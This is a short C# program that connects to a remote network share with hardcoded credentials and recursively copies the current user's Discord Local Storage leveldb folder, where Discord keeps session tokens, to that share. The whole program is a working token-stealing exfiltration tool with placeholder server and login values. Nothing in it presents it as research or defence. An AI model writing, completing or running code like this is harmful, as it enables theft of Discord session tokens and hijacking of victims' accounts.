using System;
using System.IO;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("mpr.dll")]
    private static extern int WNetAddConnection2(
        NetResource netResource,
        string password,
        string username,
        int flags);

    [StructLayout(LayoutKind.Sequential)]
    public class NetResource
    {
        public int dwScope = 0;
        public int dwType = 1;
        public int dwDisplayType = 0;
        public int dwUsage = 0;
        public string lpLocalName = null;
        public string lpRemoteName = null;
        public string lpComment = null;
        public string lpProvider = null;
    }

    static void Main()
    {
        string username = "name";
        string password = "password";

        string sourceFolder = Path.Combine(
     Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
         "discord",
         "Local Storage",
         "leveldb"
     );


        string networkPath = @"\\server ip\home";
        string folderName = Path.GetFileName(sourceFolder);

        string destinationFolder =
            Path.Combine(@"\\server ip\home\discord", folderName);

        var nr = new NetResource
        {
            lpRemoteName = networkPath
        };

        int result = WNetAddConnection2(
            nr,
            password,
            username,
            0
        );

        if (result != 0)
        {
            Console.WriteLine("Failed: " + result);
            return;
        }

        CopyDirectory(sourceFolder, destinationFolder);

        Console.WriteLine("Done!");
    }

    static void CopyDirectory(string sourceDir, string destDir)
    {
        Directory.CreateDirectory(destDir);

        foreach (string file in Directory.GetFiles(sourceDir))
        {
            string destFile =
                Path.Combine(destDir, Path.GetFileName(file));

            File.Copy(file, destFile, true);
        }

        foreach (string dir in Directory.GetDirectories(sourceDir))
        {
            string destSubDir =
                Path.Combine(destDir, Path.GetFileName(dir));

            CopyDirectory(dir, destSubDir);
        }
    }
}
